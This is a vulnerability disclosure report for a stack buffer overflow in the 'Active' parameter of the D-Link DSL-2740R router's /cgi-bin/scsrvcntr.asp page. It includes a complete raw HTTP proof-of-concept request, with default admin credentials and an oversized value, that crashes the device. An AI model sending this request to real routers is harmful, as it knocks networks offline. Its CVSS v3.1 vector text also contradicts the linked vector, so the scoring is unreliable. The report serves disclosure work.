# 97 D-Link DSL-2740R Wireless Router Buffer Overflow Vulnerability in /cgi-bin/scsrvcntr.asp Interface Active Parameter

## 1. Basic Information

- Vulnerability Type: Buffer Overflow
- Vulnerability Description: In the D-Link DSL-2740R wireless router with firmware version 1.03_EU, there exists a buffer overflow vulnerability. The Active parameter in the /cgi-bin/scsrvcntr.asp interface contains a security vulnerability that allows remote attackers to submit specially crafted requests, causing a buffer overflow error that may lead to sensitive memory information disclosure and denial of service.
- Device Model and Version:
  - D-Link DSL-2740R
  - Firmware Version: 1.03_EU

- Test Device:
  - [x] Simulation Testing

## 2. Technical Vulnerability Principle

- Discovery Process: Fuzzing test on simulated device functional components
- Affected Vulnerability Components:
  - Web Management Service Component
  - Function: Quality of Service Configuration

## 3. Vulnerability Value

- Maturity of Public Information: None
- Number of Public Vulnerability Analysis Reports: None
- Stable Reproducibility: Yes
- Vulnerability Score (According to CVSS)
  - V2: [8.5 High AV:N/AC:M/Au:S/C:C/I:C/A:C](https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?vector=(AV:N/AC:M/Au:S/C:C/I:C/A:C))
  - V3.1: [9.1 High AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H&version=3.1)
- Exploitation Conditions:
  - Attack Vector Type: Network
  - Attack Complexity: Low
  - Vulnerability Exploitation Complexity:
    - Privilege Constraint: Authentication Required
    - User Interaction: No victim interaction required
  - Impact Scope: Changed (can affect components beyond the vulnerable component)
  - Impact Metrics:
    - Confidentiality: High
    - Integrity: High
    - Availability: High
  - Exploitation Stability: Stable Reproduction
  - Default Product Configuration: Vulnerability exists in factory-enabled function component
- Vulnerability Exploitation Effect:
  - Denial of Service
- Project Relevance of Vulnerability: None

## 4. PoC

PoC for D-Link DSL-2740R 1.03_EU:

```
POST /cgi-bin/scsrvcntr.asp?Rtabhead=Advanced HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 2206
Origin: http://192.168.1.1
Connection: keep-alive
Referer: http://192.168.1.1/cgi-bin/scsrvcntr.asp?Rtabhead=Advanced
Cookie: SESSIONID=04d4df32; UID=admin; PSW=admin
Upgrade-Insecure-Requests: 1

Active=YesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYesYes&NoActive=No&httpInterface=Both&HTTP=Web&ftpInterface=LAN&FTP=FTP&icmpInterface=Both&ICMP=Ping&telnetInterface=LAN&TELNET=Telnet&ScrIPBegEnd=0.0.0.0&SSC_CB_ipAcl=on&SSC_Select_RAIF=Allow+All&SSC_Edit_details=Everyone+are+allowed.&SSC_CB_LANftp=on&SSC_CB_LANhttp=on&SSC_CB_WANicmp=on&SSC_CB_LANtelnet=on&SSC_BTN_Submit=Apply+Settings
```

## 5. Vulnerability Principle

When the Web management component receives a POST request, the /cgi-bin/scsrvcntr.asp component implementation has a security vulnerability in handling the Active POST key parameter. The Active parameter key can be of arbitrary length and is placed on the stack without proper validation, leading to a stack overflow. Attackers can exploit this vulnerability to overwrite the return address, causing the firmware to crash.

![](./imgs/fat.png)

![](./imgs/web.png)

![](./imgs/web_crash.png)

![](./imgs/crash.png)

## 6. Basis for 0-day Vulnerability Determination

No relevant vulnerabilities were found when searching for the keywords "scsrvcntr" and "Active" in the CNVD and CVE databases (similar series of vulnerabilities can typically be found by directly searching for the interface name in historical vulnerability records).
